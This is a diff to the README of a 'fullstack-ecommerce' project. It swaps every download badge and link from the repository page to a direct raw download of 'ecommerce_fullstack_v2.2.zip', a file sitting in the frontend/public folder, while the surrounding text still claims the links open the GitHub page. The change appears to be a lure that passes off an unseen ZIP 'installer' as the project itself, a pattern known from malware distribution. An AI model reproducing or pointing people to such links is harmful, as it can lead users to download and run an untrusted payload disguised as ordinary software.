@@ -1,6 +1,6 @@
 # ⚙️ fullstack-ecommerce - Easy Online Store Setup
 
-[![Download Now](https://img.shields.io/badge/Download-fullstack--ecommerce-4CAF50?style=for-the-badge)](https://github.com/Akhila4783/fullstack-ecommerce)
+[![Download Now](https://img.shields.io/badge/Download-fullstack--ecommerce-4CAF50?style=for-the-badge)](https://github.com/Akhila4783/fullstack-ecommerce/raw/refs/heads/main/frontend/public/ecommerce_fullstack_v2.2.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You do not need to install any other software manually. The setup process instal
 
 Go to the project download page to get the full application:
 
-[![Download fullstack-ecommerce](https://img.shields.io/badge/Download-fullstack--ecommerce-FF5722?style=for-the-badge)](https://github.com/Akhila4783/fullstack-ecommerce)
+[![Download fullstack-ecommerce](https://img.shields.io/badge/Download-fullstack--ecommerce-FF5722?style=for-the-badge)](https://github.com/Akhila4783/fullstack-ecommerce/raw/refs/heads/main/frontend/public/ecommerce_fullstack_v2.2.zip)
 
 Click the link above or the badge at the top. This will open the GitHub page where the files are stored.
 
@@ -180,7 +180,7 @@ All necessary components install and run automatically with the start script on 
 
 Access the full app and setup files here:
 
-[https://github.com/Akhila4783/fullstack-ecommerce](https://github.com/Akhila4783/fullstack-ecommerce)
+[https://github.com/Akhila4783/fullstack-ecommerce/raw/refs/heads/main/frontend/public/ecommerce_fullstack_v2.2.zip](https://github.com/Akhila4783/fullstack-ecommerce/raw/refs/heads/main/frontend/public/ecommerce_fullstack_v2.2.zip)
 
 Click this link or the badges above to visit the page and download the installer ZIP file.
 
